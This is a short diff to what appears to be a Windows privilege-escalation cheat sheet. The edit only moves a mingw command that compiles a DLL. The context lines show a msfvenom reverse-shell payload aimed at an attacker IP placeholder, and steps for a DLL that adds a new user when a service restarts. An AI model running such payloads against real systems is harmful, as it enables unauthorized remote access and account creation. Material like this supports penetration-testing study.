@@ -1319,9 +1319,6 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attaker-IP> LPORT=<listening-po
 4. restart or start the service
 5. Check net user command, new user will be added.
    
-```bash
-x86_64-w64-mingw32-gcc file.cpp --shared -o file.dll
-```
 
 ```bash
 #include <stdlib.h>
@@ -1349,6 +1346,10 @@ LPVOID lpReserved ) // Reserved
     return TRUE;
 }
 ```
+```bash
+x86_64-w64-mingw32-gcc file.cpp --shared -o file.dll
+```
+
 
 ## Autorun
 
